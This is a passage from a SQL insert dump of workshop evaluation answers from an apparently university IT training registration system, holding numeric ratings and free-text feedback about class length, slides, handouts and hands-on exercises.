('evaluations', '319', 35, '1'),
('evaluations', '319', 36, ''),
('evaluations', '319', 37, ''),
('evaluations', '319', 38, '1'),
('evaluations', '319', 39, '4'),
('evaluations', '32', 24, '0'),
('evaluations', '32', 25, '0'),
('evaluations', '32', 26, '0'),
('evaluations', '32', 27, '0'),
('evaluations', '32', 28, '2'),
('evaluations', '32', 30, '1'),
('evaluations', '32', 31, '1'),
('evaluations', '32', 32, '0'),
('evaluations', '32', 33, '0'),
('evaluations', '32', 34, '0'),
('evaluations', '32', 35, '0'),
('evaluations', '32', 36, 'Since there was time left over, more detailed examples might be helpful--perhaps a single set of example objects to illustrate the various concepts.'),
('evaluations', '32', 37, ''),
('evaluations', '32', 38, '0'),
('evaluations', '32', 39, '0'),
('evaluations', '320', 24, '0'),
('evaluations', '320', 25, '0'),
('evaluations', '320', 26, '0'),
('evaluations', '320', 27, '0'),
('evaluations', '320', 28, '2'),
('evaluations', '320', 30, '1'),
('evaluations', '320', 31, '0'),
('evaluations', '320', 32, '0'),
('evaluations', '320', 33, '0'),
('evaluations', '320', 34, '0'),
('evaluations', '320', 35, '0'),
('evaluations', '320', 36, 'I think the workshop could have been a little longer. Tim is a valuable resource and it would have been nice to have had a little more time for questions and picking his brain.'),
('evaluations', '320', 37, ''),
('evaluations', '320', 38, '0'),
('evaluations', '320', 39, '1'),
('evaluations', '321', 24, '0'),
('evaluations', '321', 25, '0'),
('evaluations', '321', 26, '0'),
('evaluations', '321', 27, '0'),
('evaluations', '321', 28, '2'),
('evaluations', '321', 30, '2'),
('evaluations', '321', 31, '0'),
('evaluations', '321', 32, '0'),
('evaluations', '321', 33, '0'),
('evaluations', '321', 34, '0'),
('evaluations', '321', 35, '0'),
('evaluations', '321', 36, 'Lengthen the class by 10 to 15 minutes.'),
('evaluations', '321', 37, 'availability of handouts'),
('evaluations', '321', 38, '1'),
('evaluations', '321', 39, '1'),
('evaluations', '322', 24, '0'),
('evaluations', '322', 25, '0'),
('evaluations', '322', 26, '0'),
('evaluations', '322', 27, '0'),
('evaluations', '322', 28, '0'),
('evaluations', '322', 30, '1'),
('evaluations', '322', 31, '1'),
('evaluations', '322', 32, '0'),
('evaluations', '322', 33, '1'),
('evaluations', '322', 34, '0'),
('evaluations', '322', 35, '0'),
('evaluations', '322', 36, 'Too much material, too little time. A bit more interest (or summary level) in visuals would have helped keep attention better.'),
('evaluations', '322', 37, 'Handouts were not available. Classmate interface is difficult to understand.'),
('evaluations', '322', 38, '2'),
('evaluations', '322', 39, '2'),
('evaluations', '323', 24, '0'),
('evaluations', '323', 25, '0'),
('evaluations', '323', 26, '0'),
('evaluations', '323', 27, '0'),
('evaluations', '323', 28, '2'),
('evaluations', '323', 30, '2'),
('evaluations', '323', 31, '0'),
('evaluations', '323', 32, '0'),
('evaluations', '323', 33, '0'),
('evaluations', '323', 34, '0'),
('evaluations', '323', 35, '0'),
('evaluations', '323', 36, ''),
('evaluations', '323', 37, 'put radio buttons justified right so the arrow to go to next screen is directly below'),
('evaluations', '323', 38, '3'),
('evaluations', '323', 39, '1'),
('evaluations', '324', 24, '0'),
('evaluations', '324', 25, '0'),
('evaluations', '324', 26, '0'),
('evaluations', '324', 27, '1'),
('evaluations', '324', 28, '2'),
('evaluations', '324', 30, '2'),
('evaluations', '324', 31, '0'),
('evaluations', '324', 32, '1'),
('evaluations', '324', 33, '0'),
('evaluations', '324', 34, '0'),
('evaluations', '324', 35, '0'),
('evaluations', '324', 36, ''),
('evaluations', '324', 37, ''),
('evaluations', '324', 38, '0'),
('evaluations', '324', 39, '0'),
('evaluations', '325', 24, '2'),
('evaluations', '325', 25, '3'),
('evaluations', '325', 26, '0'),
('evaluations', '325', 27, '1'),
('evaluations', '325', 28, '1'),
('evaluations', '325', 30, '1'),
('evaluations', '325', 31, '1'),
('evaluations', '325', 32, '2'),
('evaluations', '325', 33, '2'),
('evaluations', '325', 34, '2'),
('evaluations', '325', 35, '1'),
('evaluations', '325', 36, 'test2'),
('evaluations', '325', 37, 'test'),
('evaluations', '325', 38, '0'),
('evaluations', '325', 39, '0'),
('evaluations', '327', 24, ''),
('evaluations', '327', 25, ''),
('evaluations', '327', 26, ''),
('evaluations', '327', 27, ''),
('evaluations', '327', 28, ''),
('evaluations', '327', 30, ''),
('evaluations', '327', 31, ''),
('evaluations', '327', 32, ''),
('evaluations', '327', 33, ''),
('evaluations', '327', 34, ''),
('evaluations', '327', 35, ''),
('evaluations', '327', 36, ''),
('evaluations', '327', 37, ''),
('evaluations', '327', 38, ''),
('evaluations', '327', 39, ''),
('evaluations', '33', 24, '1'),
('evaluations', '33', 25, '0'),
('evaluations', '33', 26, '0'),
('evaluations', '33', 27, '0'),
('evaluations', '33', 28, '0'),
('evaluations', '33', 30, '1'),
('evaluations', '33', 31, '1'),
('evaluations', '33', 32, '1'),
('evaluations', '33', 33, '1'),
('evaluations', '33', 34, '1'),
('evaluations', '33', 35, '1'),
('evaluations', '33', 36, 'Some hands on excercises will be helpful.'),
('evaluations', '33', 37, ''),
('evaluations', '33', 38, '0'),
('evaluations', '33', 39, '0'),
('evaluations', '34', 24, '1'),
('evaluations', '34', 25, '0'),
('evaluations', '34', 26, '0'),
('evaluations', '34', 27, '0'),
('evaluations', '34', 28, '2'),
('evaluations', '34', 30, '2'),
('evaluations', '34', 31, '1'),
('evaluations', '34', 32, '0'),
('evaluations', '34', 33, '0'),
('evaluations', '34', 34, '0'),
('evaluations', '34', 35, '0'),
('evaluations', '34', 36, ''),
('evaluations', '34', 37, ''),
('evaluations', '34', 38, '1'),
('evaluations', '34', 39, '1'),
('evaluations', '35', 24, '1'),
('evaluations', '35', 25, '1'),
('evaluations', '35', 26, '1'),
('evaluations', '35', 27, '1'),
('evaluations', '35', 28, '0'),
('evaluations', '35', 30, '1'),
('evaluations', '35', 31, '1'),
('evaluations', '35', 32, '1'),
('evaluations', '35', 33, '1'),
('evaluations', '35', 34, '1'),
('evaluations', '35', 35, '1'),
('evaluations', '35', 36, ''),
('evaluations', '35', 37, 'seems like when I logged in I was taken to someplace unexpected and had to navigate back to where I want to be'),
('evaluations', '35', 38, '2'),
('evaluations', '35', 39, '1'),
('evaluations', '36', 24, '0'),
('evaluations', '36', 25, '0'),
('evaluations', '36', 26, '0'),
('evaluations', '36', 27, '0'),
('evaluations', '36', 28, '2'),
('evaluations', '36', 30, '2'),
('evaluations', '36', 31, '0'),
('evaluations', '36', 32, '0'),
('evaluations', '36', 33, '1'),
('evaluations', '36', 34, '0'),
('evaluations', '36', 35, '0'),
('evaluations', '36', 36, 'Hands on tutorials is a great way to enhance the value.'),
('evaluations', '36', 37, ''),
('evaluations', '36', 38, '0'),
('evaluations', '36', 39, '0'),
('evaluations', '37', 24, '1'),
('evaluations', '37', 25, '0'),
('evaluations', '37', 26, '0'),
('evaluations', '37', 27, '1'),
('evaluations', '37', 28, '0'),
('evaluations', '37', 30, '1'),
('evaluations', '37', 31, '2'),
('evaluations', '37', 32, '2'),
('evaluations', '37', 33, '2'),
('evaluations', '37', 34, '1'),
('evaluations', '37', 35, '1'),
('evaluations', '37', 36, 'I''d recommend this class for developers.  I am not a developer, I''m just a "procedural" php web site maker, so this stuff while interesting is beyond what I need.  \r\n\r\nI''d recommend slowing down, don''t ask "do you get this?" so often, and try to have better ways to illustrate the why in why something is useful - real world examples are nice.  \r\n\r\nThanks for offering this workshop.'),
('evaluations', '37', 37, ''),
('evaluations', '37', 38, '0'),
('evaluations', '37', 39, '0'),
('evaluations', '38', 24, '0'),
('evaluations', '38', 25, '0'),
('evaluations', '38', 26, '0'),
('evaluations', '38', 27, '0'),
('evaluations', '38', 28, '2'),
('evaluations', '38', 30, '2'),
('evaluations', '38', 31, '0'),
('evaluations', '38', 32, '0'),
('evaluations', '38', 33, '1'),
('evaluations', '38', 34, '0'),
('evaluations', '38', 35, '1'),
('evaluations', '38', 36, ''),
('evaluations', '38', 37, ''),
('evaluations', '38', 38, '1'),
('evaluations', '38', 39, '0'),
('evaluations', '39', 24, '1'),
('evaluations', '39', 25, '1'),
('evaluations', '39', 26, '1'),
('evaluations', '39', 27, '1'),
('evaluations', '39', 28, '2'),
('evaluations', '39', 30, '2'),
('evaluations', '39', 31, '1'),
('evaluations', '39', 32, '1'),
('evaluations', '39', 33, '4'),
('evaluations', '39', 34, '1'),
('evaluations', '39', 35, '1'),
('evaluations', '39', 36, 'This may be covered in your design patterns workshop, but using OOP techniques in conjuction with drawing GUI interfaces would be helpful.'),
('evaluations', '39', 37, 'ClassMate needs more classes!'),
('evaluations', '39', 38, '0'),
('evaluations', '39', 39, '1'),
('evaluations', '40', 24, '0'),
('evaluations', '40', 25, '0'),
('evaluations', '40', 26, '0'),
('evaluations', '40', 27, '1'),
('evaluations', '40', 28, '0'),
('evaluations', '40', 30, '2'),
('evaluations', '40', 31, '1'),
('evaluations', '40', 32, '1'),
('evaluations', '40', 33, '1'),
('evaluations', '40', 34, '0'),
('evaluations', '40', 35, '0'),
('evaluations', '40', 36, '1) Have the slides available ahead of time so we can jot notes as you go through them, rather than paying attention to full note taking.\r\n2) where I was sitting, I couldn''t see the bottom 20% of the screen because of the front row -- I can sit somewhere else, but those that sit in the back will miss the results in the code slides'),
('evaluations', '40', 37, 'So far, it seems to be a good system...'),
('evaluations', '40', 38, '0'),
('evaluations', '40', 39, '0'),
('evaluations', '41', 24, '0'),
('evaluations', '41', 25, '0'),
('evaluations', '41', 26, '0'),
('evaluations', '41', 27, '0'),
('evaluations', '41', 28, '2'),
('evaluations', '41', 30, '1'),
('evaluations', '41', 31, '1'),
('evaluations', '41', 32, '0'),
('evaluations', '41', 33, '0'),
('evaluations', '41', 34, '0'),
('evaluations', '41', 35, '0'),
('evaluations', '41', 36, 'Fill up the rest of the time with some short hands on exercises.'),
('evaluations', '41', 37, ''),
('evaluations', '41', 38, '1'),
('evaluations', '41', 39, '0'),
('evaluations', '42', 24, '1'),
('evaluations', '42', 25, '1'),
('evaluations', '42', 26, '1'),
('evaluations', '42', 27, '1'),
('evaluations', '42', 28, '2'),
('evaluations', '42', 30, '2'),
('evaluations', '42', 31, '0'),
('evaluations', '42', 32, '1'),
('evaluations', '42', 33, '4'),
('evaluations', '42', 34, '1'),
('evaluations', '42', 35, '1'),
('evaluations', '42', 36, 'Architectural patterns were a bit too theoretical to be useful, but it was nice to have an overview.'),
('evaluations', '42', 37, 'None'),
('evaluations', '42', 38, '0'),
('evaluations', '42', 39, '1'),
('evaluations', '43', 24, '0'),
('evaluations', '43', 25, '0'),
('evaluations', '43', 26, '0'),
('evaluations', '43', 27, '0'),
('evaluations', '43', 28, '2'),
('evaluations', '43', 30, '2'),
('evaluations', '43', 31, '0'),
('evaluations', '43', 32, '0'),
('evaluations', '43', 33, '0'),
('evaluations', '43', 34, '0'),
('evaluations', '43', 35, '0'),
('evaluations', '43', 36, 'code examples were very good for illustrating concepts'),
('evaluations', '43', 37, ''),
('evaluations', '43', 38, '0'),
('evaluations', '43', 39, '0'),
('evaluations', '44', 24, '1'),
('evaluations', '44', 25, '0'),
('evaluations', '44', 26, '1'),
('evaluations', '44', 27, '1'),
('evaluations', '44', 28, '2'),
('evaluations', '44', 30, '0'),
('evaluations', '44', 31, '1'),
('evaluations', '44', 32, '1'),
('evaluations', '44', 33, '1'),
('evaluations', '44', 34, '1'),
('evaluations', '44', 35, '1'),
('evaluations', '44', 36, 'Having it be a little more hands on would make it slightly more accessible.'),
('evaluations', '44', 37, ''),
('evaluations', '44', 38, '1'),
('evaluations', '44', 39, '1'),
('evaluations', '45', 24, '1'),
('evaluations', '45', 25, '1'),
('evaluations', '45', 26, '1'),
('evaluations', '45', 27, '1'),
('evaluations', '45', 28, '2'),
('evaluations', '45', 30, '2'),
('evaluations', '45', 31, '1'),
('evaluations', '45', 32, '1'),
('evaluations', '45', 33, '1'),
('evaluations', '45', 34, '1'),
('evaluations', '45', 35, '1'),
('evaluations', '45', 36, ''),
('evaluations', '45', 37, ''),
('evaluations', '45', 38, '1'),
('evaluations', '45', 39, '1'),
('evaluations', '46', 24, '1'),
('evaluations', '46', 25, '1'),
('evaluations', '46', 26, '1'),
('evaluations', '46', 27, '1'),
('evaluations', '46', 28, '1'),
('evaluations', '46', 30, '0'),
('evaluations', '46', 31, '1'),
('evaluations', '46', 32, '4'),
('evaluations', '46', 33, '2'),
('evaluations', '46', 34, '1'),
('evaluations', '46', 35, '1'),
('evaluations', '46', 36, 'Practical examples.'),
('evaluations', '46', 37, 'Allow evaluations of a class after its over.'),
('evaluations', '46', 38, '1'),
('evaluations', '46', 39, '1'),
('evaluations', '47', 24, '0'),
('evaluations', '47', 25, '0'),
('evaluations', '47', 26, '0'),
('evaluations', '47', 27, '0'),
('evaluations', '47', 28, '2'),
('evaluations', '47', 30, '2'),
('evaluations', '47', 31, '1'),
('evaluations', '47', 32, '1'),
('evaluations', '47', 33, '1'),
('evaluations', '47', 34, '0'),
('evaluations', '47', 35, '1'),
('evaluations', '47', 36, ''),
('evaluations', '47', 37, ''),
('evaluations', '47', 38, '0'),
('evaluations', '47', 39, '1'),
('evaluations', '48', 24, '0'),
('evaluations', '48', 25, '0'),
('evaluations', '48', 26, '0'),
('evaluations', '48', 27, '0'),
('evaluations', '48', 28, '2'),
('evaluations', '48', 30, '2'),
('evaluations', '48', 31, '1'),
('evaluations', '48', 32, '1'),
('evaluations', '48', 33, '0'),
('evaluations', '48', 34, '0'),
('evaluations', '48', 35, '0'),
('evaluations', '48', 36, 'Great work guys... can''t wait for the next class... :)'),
('evaluations', '48', 37, 'Thanks for the notes pre-class. you fixed a problem I mentioned last time :)'),
('evaluations', '48', 38, '0'),
('evaluations', '48', 39, '0'),
('evaluations', '49', 24, '0'),
('evaluations', '49', 25, '0'),
('evaluations', '49', 26, '0'),
('evaluations', '49', 27, '0'),
('evaluations', '49', 28, '2'),
('evaluations', '49', 30, '2'),
('evaluations', '49', 31, '0'),
('evaluations', '49', 32, '0'),
('evaluations', '49', 33, '1'),
('evaluations', '49', 34, '0'),
('evaluations', '49', 35, '0'),
('evaluations', '49', 36, ''),
('evaluations', '49', 37, ''),
('evaluations', '49', 38, '0'),
('evaluations', '49', 39, '0'),
('evaluations', '50', 24, '0'),
('evaluations', '50', 25, '0'),
('evaluations', '50', 26, '0'),
('evaluations', '50', 27, '1'),
('evaluations', '50', 28, '2'),
('evaluations', '50', 30, '2'),
('evaluations', '50', 31, '1'),
('evaluations', '50', 32, '1'),
('evaluations', '50', 33, '4'),
('evaluations', '50', 34, '1'),
('evaluations', '50', 35, '1'),
('evaluations', '50', 36, 'Maybe take one or two other commonly used design patterns with detail hands on example to make into a full-length class to offer.'),
('evaluations', '50', 37, 'none'),
('evaluations', '50', 38, '0'),
('evaluations', '50', 39, '1'),
('evaluations', '51', 24, '0'),
('evaluations', '51', 25, '0'),
('evaluations', '51', 26, '0'),
('evaluations', '51', 27, '0'),
('evaluations', '51', 28, '2'),
('evaluations', '51', 30, '2'),
('evaluations', '51', 31, '0'),
('evaluations', '51', 32, '1'),
('evaluations', '51', 33, '1'),
('evaluations', '51', 34, '0'),
('evaluations', '51', 35, '0'),
('evaluations', '51', 36, 'Keynote presentation avail ahead of time is great! Would like textural copy before class, too.'),
('evaluations', '51', 37, ''),
('evaluations', '51', 38, '0'),
('evaluations', '51', 39, '0'),
('evaluations', '52', 24, '0'),
('evaluations', '52', 25, '0'),
('evaluations', '52', 26, '0'),
('evaluations', '52', 27, '0'),
('evaluations', '52', 28, '2'),
('evaluations', '52', 30, '2'),
('evaluations', '52', 31, '1'),
('evaluations', '52', 32, '1'),
('evaluations', '52', 33, '1'),
('evaluations', '52', 34, '0'),
('evaluations', '52', 35, '1'),
('evaluations', '52', 36, 'show practical/working examples'),
('evaluations', '52', 37, 'the email notification was incorrect.'),
('evaluations', '52', 38, '1'),
('evaluations', '52', 39, '2'),
('evaluations', '53', 24, '1'),
('evaluations', '53', 25, '0'),
('evaluations', '53', 26, '0'),
('evaluations', '53', 27, '1'),
('evaluations', '53', 28, '2'),
('evaluations', '53', 30, '2'),
('evaluations', '53', 31, '1'),
('evaluations', '53', 32, '1'),
('evaluations', '53', 33, '1'),
('evaluations', '53', 34, '1'),
('evaluations', '53', 35, '1'),
('evaluations', '53', 36, ''),
('evaluations', '53', 37, ''),
('evaluations', '53', 38, '0'),
('evaluations', '53', 39, '0'),
('evaluations', '54', 24, '0'),
('evaluations', '54', 25, '0'),
('evaluations', '54', 26, '0'),
('evaluations', '54', 27, '0'),
('evaluations', '54', 28, '2'),
('evaluations', '54', 30, '2'),
('evaluations', '54', 31, '1'),
('evaluations', '54', 32, '1'),
('evaluations', '54', 33, '1'),
('evaluations', '54', 34, '0'),
('evaluations', '54', 35, '1'),
('evaluations', '54', 36, ''),
('evaluations', '54', 37, 'It works really well :)'),
('evaluations', '54', 38, '0'),
('evaluations', '54', 39, '0'),
('evaluations', '55', 24, '1'),
('evaluations', '55', 25, '0'),
('evaluations', '55', 26, '0'),
('evaluations', '55', 27, '0'),
('evaluations', '55', 28, '2'),
('evaluations', '55', 30, '2'),
('evaluations', '55', 31, '1'),
('evaluations', '55', 32, '1'),
('evaluations', '55', 33, '1'),
('evaluations', '55', 34, '1'),
('evaluations', '55', 35, '0'),
('evaluations', '55', 36, ''),
('evaluations', '55', 37, ''),
('evaluations', '55', 38, '1'),
('evaluations', '55', 39, '0'),
('evaluations', '56', 24, '0'),
('evaluations', '56', 25, '0'),
('evaluations', '56', 26, '1'),
('evaluations', '56', 27, '1'),
('evaluations', '56', 28, '2'),
('evaluations', '56', 30, '1'),
('evaluations', '56', 31, '1'),
('evaluations', '56', 32, '1'),
('evaluations', '56', 33, '1'),
('evaluations', '56', 34, '0'),
('evaluations', '56', 35, '1'),
('evaluations', '56', 36, ''),
('evaluations', '56', 37, 'Include a class before this to explain OOP in a beginner setting.'),
('evaluations', '56', 38, '0'),
('evaluations', '56', 39, '0'),
('evaluations', '57', 24, '1'),
('evaluations', '57', 25, '0'),
('evaluations', '57', 26, '1'),
('evaluations', '57', 27, '1'),
('evaluations', '57', 28, '2'),
('evaluations', '57', 30, '2'),
('evaluations', '57', 31, '1'),
('evaluations', '57', 32, '1'),
('evaluations', '57', 33, '1'),
('evaluations', '57', 34, '1'),
('evaluations', '57', 35, '1'),
('evaluations', '57', 36, ''),
('evaluations', '57', 37, ''),
('evaluations', '57', 38, '1'),
('evaluations', '57', 39, '1'),
('evaluations', '58', 24, '1'),
('evaluations', '58', 25, '0'),
('evaluations', '58', 26, '1'),
('evaluations', '58', 27, '1'),
('evaluations', '58', 28, '2'),
('evaluations', '58', 30, '2'),
('evaluations', '58', 31, '0'),
('evaluations', '58', 32, '1'),
('evaluations', '58', 33, '1'),
('evaluations', '58', 34, '1'),
('evaluations', '58', 35, '1'),
('evaluations', '58', 36, 'The reddish background on the slides made printing difficult to get a legible slide. Black text on white would be much better.'),
('evaluations', '58', 37, ''),
('evaluations', '58', 38, '1'),
('evaluations', '58', 39, '0'),
('evaluations', '59', 24, '1'),
('evaluations', '59', 25, '0'),
('evaluations', '59', 26, '0'),
('evaluations', '59', 27, '0'),
('evaluations', '59', 28, '2'),
('evaluations', '59', 30, '2'),
('evaluations', '59', 31, '1'),
('evaluations', '59', 32, '1'),
('evaluations', '59', 33, '1'),
('evaluations', '59', 34, '1'),
('evaluations', '59', 35, '1'),
('evaluations', '59', 36, 'There isn''t anything I would think to change other than the aforementioned comment about making to slides available in both .pdf and .ppt for more ease in printing multiple slides per page before I came to the class.'),
('evaluations', '59', 37, 'When posting materials for the class, (i.e, the .PDF file with all the of the class slides) it would have been helpful to post it as an actual powerpoint file as well.  That would have made it easier for me to print multiple slides per page, or with a notes section.'),
('evaluations', '59', 38, '1'),
('evaluations', '59', 39, '0'),
('evaluations', '60', 24, '1'),
('evaluations', '60', 25, '0'),
('evaluations', '60', 26, '1'),
('evaluations', '60', 27, '1'),
('evaluations', '60', 28, '2'),
('evaluations', '60', 30, '2'),
('evaluations', '60', 31, '0'),
('evaluations', '60', 32, '4'),
('evaluations', '60', 33, '4'),
('evaluations', '60', 34, '1'),
('evaluations', '60', 35, '1'),
('evaluations', '60', 36, 'Provide working copies of the code for download rather than just in the slides.  Might make it easier for people to implement it once they get out of class.'),
('evaluations', '60', 37, ''),
('evaluations', '60', 38, '1'),
('evaluations', '60', 39, '1'),
('evaluations', '61', 24, '1'),
('evaluations', '61', 25, '0'),
('evaluations', '61', 26, '0'),
('evaluations', '61', 27, '1'),
('evaluations', '61', 28, '2'),
('evaluations', '61', 30, '2'),
('evaluations', '61', 31, '0'),
('evaluations', '61', 32, '1'),
('evaluations', '61', 33, '1'),
('evaluations', '61', 34, '1'),
('evaluations', '61', 35, '1'),
('evaluations', '61', 36, 'Nothing that I can think of at the moment.'),
('evaluations', '61', 37, 'No suggestions that I can think of.'),
('evaluations', '61', 38, '0'),
('evaluations', '61', 39, '0'),
('evaluations', '62', 24, '0'),
('evaluations', '62', 25, '0'),
('evaluations', '62', 26, '1'),
('evaluations', '62', 27, '0'),
('evaluations', '62', 28, '2'),
('evaluations', '62', 30, '2'),
('evaluations', '62', 31, '0'),
('evaluations', '62', 32, '1'),
('evaluations', '62', 33, '0'),
('evaluations', '62', 34, '1'),
('evaluations', '62', 35, '1'),
('evaluations', '62', 36, ''),
('evaluations', '62', 37, ''),
('evaluations', '62', 38, '1'),
('evaluations', '62', 39, '1'),
('evaluations', '63', 24, '1'),
('evaluations', '63', 25, '0'),
('evaluations', '63', 26, '1'),
('evaluations', '63', 27, '1'),
('evaluations', '63', 28, '2'),
('evaluations', '63', 30, '2'),
('evaluations', '63', 31, '1'),
('evaluations', '63', 32, '1'),
('evaluations', '63', 33, '1'),
('evaluations', '63', 34, '1'),
('evaluations', '63', 35, '1'),
('evaluations', '63', 36, ''),
('evaluations', '63', 37, ''),
('evaluations', '63', 38, '1'),
('evaluations', '63', 39, '1'),
('evaluations', '64', 24, '0'),
('evaluations', '64', 25, '0'),
('evaluations', '64', 26, '0'),
('evaluations', '64', 27, '1'),
('evaluations', '64', 28, '2'),
('evaluations', '64', 30, '2'),
('evaluations', '64', 31, '1'),
('evaluations', '64', 32, '1'),
('evaluations', '64', 33, '1'),
('evaluations', '64', 34, '0'),
('evaluations', '64', 35, '1'),
('evaluations', '64', 36, ''),
('evaluations', '64', 37, ''),
('evaluations', '64', 38, '1'),
('evaluations', '64', 39, '1'),
('evaluations', '65', 24, '1'),
('evaluations', '65', 25, '1'),
('evaluations', '65', 26, '1'),
('evaluations', '65', 27, '1'),
('evaluations', '65', 28, '2'),
('evaluations', '65', 30, '2'),
('evaluations', '65', 31, '2'),
('evaluations', '65', 32, '1'),
('evaluations', '65', 33, '1'),
('evaluations', '65', 34, '1'),
('evaluations', '65', 35, '1'),
('evaluations', '65', 36, ''),
('evaluations', '65', 37, ''),
('evaluations', '65', 38, '1'),
('evaluations', '65', 39, '1'),
('evaluations', '66', 24, '0'),
('evaluations', '66', 25, '0'),
('evaluations', '66', 26, '0'),
('evaluations', '66', 27, '0'),
('evaluations', '66', 28, '2'),
('evaluations', '66', 30, '2'),
('evaluations', '66', 31, '0'),
('evaluations', '66', 32, '0'),
('evaluations', '66', 33, '1'),
('evaluations', '66', 34, '0'),
('evaluations', '66', 35, '0'),
('evaluations', '66', 36, ''),
('evaluations', '66', 37, ''),
('evaluations', '66', 38, '0'),
('evaluations', '66', 39, '0'),
('evaluations', '67', 24, '1'),
('evaluations', '67', 25, '0'),
('evaluations', '67', 26, '0'),
('evaluations', '67', 27, '0'),
('evaluations', '67', 28, '2'),
('evaluations', '67', 30, '2'),
('evaluations', '67', 31, '1'),
('evaluations', '67', 32, '1'),
('evaluations', '67', 33, '1'),
('evaluations', '67', 34, '0'),
('evaluations', '67', 35, '1'),
('evaluations', '67', 36, ''),
('evaluations', '67', 37, ''),
('evaluations', '67', 38, '1'),
('evaluations', '67', 39, '0'),
('evaluations', '68', 24, '0'),
('evaluations', '68', 25, '0'),
('evaluations', '68', 26, '0'),
('evaluations', '68', 27, '0'),
('evaluations', '68', 28, '2'),
('evaluations', '68', 30, '1'),
('evaluations', '68', 31, '1'),
('evaluations', '68', 32, '1'),
('evaluations', '68', 33, '1'),
('evaluations', '68', 34, '0'),
('evaluations', '68', 35, '0'),
('evaluations', '68', 36, 'My only suggestion would be to add hands-on practice utilizing tools presented in the workshop.  Jason & Garrison did an extremely good job.'),
('evaluations', '68', 37, 'Hands-on practice utilizing tools presented in the workshop.  No areas for concern; these guys are extremely sharp.'),
('evaluations', '68', 38, '0'),
('evaluations', '68', 39, '0'),
('evaluations', '69', 24, '0'),
('evaluations', '69', 25, '0'),
('evaluations', '69', 26, '0'),
('evaluations', '69', 27, '0'),
('evaluations', '69', 28, '2'),
('evaluations', '69', 30, '2'),
('evaluations', '69', 31, '1'),
('evaluations', '69', 32, '1'),
('evaluations', '69', 33, '1'),
('evaluations', '69', 34, '0'),
('evaluations', '69', 35, '1'),
('evaluations', '69', 36, ''),
('evaluations', '69', 37, ''),
('evaluations', '69', 38, '0'),
('evaluations', '69', 39, '0'),
('evaluations', '70', 24, '0'),
('evaluations', '70', 25, '0'),
('evaluations', '70', 26, '0'),
('evaluations', '70', 27, '1'),
('evaluations', '70', 28, '0'),
('evaluations', '70', 30, '0'),
('evaluations', '70', 31, '0'),
('evaluations', '70', 32, '0'),
('evaluations', '70', 33, '0'),
('evaluations', '70', 34, '0'),
('evaluations', '70', 35, '0'),
('evaluations', '70', 36, ''),
('evaluations', '70', 37, ''),
('evaluations', '70', 38, '0'),
('evaluations', '70', 39, '1'),
('evaluations', '71', 24, '0'),
('evaluations', '71', 25, '0'),
('evaluations', '71', 26, '0'),
('evaluations', '71', 27, '0'),
('evaluations', '71', 28, '2'),
('evaluations', '71', 30, '2'),
('evaluations', '71', 31, '1'),
('evaluations', '71', 32, '0'),
('evaluations', '71', 33, '0'),
('evaluations', '71', 34, '0'),
('evaluations', '71', 35, '0'),
('evaluations', '71', 36, ''),
('evaluations', '71', 37, ''),
('evaluations', '71', 38, '0'),
('evaluations', '71', 39, '0'),
('evaluations', '72', 24, '0'),
('evaluations', '72', 25, '0'),
('evaluations', '72', 26, '0'),
('evaluations', '72', 27, '0'),
('evaluations', '72', 28, '2'),
('evaluations', '72', 30, '2'),
('evaluations', '72', 31, '0'),
('evaluations', '72', 32, '1'),
('evaluations', '72', 33, '2'),
('evaluations', '72', 34, '0'),
('evaluations', '72', 35, '1'),
('evaluations', '72', 36, ''),
('evaluations', '72', 37, 'calendar attachment file like ics so i can easily add my class to my calendar.'),
('evaluations', '72', 38, '1'),
('evaluations', '72', 39, '0'),
('evaluations', '73', 24, '0'),
('evaluations', '73', 25, '0'),
('evaluations', '73', 26, '0'),
('evaluations', '73', 27, '0'),
('evaluations', '73', 28, '2'),
('evaluations', '73', 30, '2'),
('evaluations', '73', 31, '0'),
('evaluations', '73', 32, '0'),
('evaluations', '73', 33, '0'),
('evaluations', '73', 34, '0'),
('evaluations', '73', 35, '0'),
('evaluations', '73', 36, ''),
('evaluations', '73', 37, ''),
('evaluations', '73', 38, '1'),
('evaluations', '73', 39, '0'),
('evaluations', '74', 24, '0'),
('evaluations', '74', 25, '0'),
('evaluations', '74', 26, '0'),
('evaluations', '74', 27, '0'),
('evaluations', '74', 28, '2'),
('evaluations', '74', 30, '2'),
('evaluations', '74', 31, '0'),
('evaluations', '74', 32, '1'),
('evaluations', '74', 33, '4'),
('evaluations', '74', 34, '0'),
('evaluations', '74', 35, '0'),
('evaluations', '74', 36, 'This workshop is exactly what CNR IT needed.  The staff found it to be completely appropriate -- which is impressive considering how much we went over.  Many thanks to OIT -- and especially Everette!'),
('evaluations', '74', 37, 'This registration system rocks.  You all put the right features in with a great UI.  Well done!'),
('evaluations', '74', 38, '0'),
('evaluations', '74', 39, '0'),
('evaluations', '75', 24, '0'),
('evaluations', '75', 25, '0'),
('evaluations', '75', 26, '0'),
('evaluations', '75', 27, '0'),
('evaluations', '75', 28, '2'),
('evaluations', '75', 30, '2'),
('evaluations', '75', 31, '0'),
('evaluations', '75', 32, '0'),
('evaluations', '75', 33, '1'),
('evaluations', '75', 34, '0'),
('evaluations', '75', 35, '0'),
('evaluations', '75', 36, ''),
('evaluations', '75', 37, ''),
('evaluations', '75', 38, '0'),
('evaluations', '75', 39, '0'),
('evaluations', '76', 36, ''),
('evaluations', '76', 37, ''),
('evaluations', '76', 38, '0'),
('evaluations', '77', 24, '0'),
('evaluations', '77', 25, '0'),
('evaluations', '77', 26, '0'),
('evaluations', '77', 27, '0'),
('evaluations', '77', 28, '2'),
('evaluations', '77', 30, '2'),
('evaluations', '77', 31, '1'),
('evaluations', '77', 32, '1'),
('evaluations', '77', 33, '1'),
('evaluations', '77', 34, '0'),
('evaluations', '77', 35, '0'),
('evaluations', '77', 36, 'The "B" in Twanda Baker stands for daBOMB - she is a great instructor!!!'),
('evaluations', '77', 37, ''),
('evaluations', '77', 38, '1'),
('evaluations', '77', 39, '1'),
('evaluations', '78', 24, '1'),
('evaluations', '78', 25, '0'),
('evaluations', '78', 26, '0'),
('evaluations', '78', 27, '1'),
('evaluations', '78', 28, '2'),
('evaluations', '78', 30, '2'),
('evaluations', '78', 31, '0'),
('evaluations', '78', 32, '1'),
('evaluations', '78', 33, '1'),
('evaluations', '78', 34, '1'),
('evaluations', '78', 35, '1'),
('evaluations', '78', 36, ''),
('evaluations', '78', 37, ''),
('evaluations', '78', 38, '1'),
('evaluations', '78', 39, '1'),
('evaluations', '79', 24, '0'),
('evaluations', '79', 25, '0'),
('evaluations', '79', 26, '0'),
('evaluations', '79', 27, '1'),
('evaluations', '79', 28, '2'),
('evaluations', '79', 30, '2'),
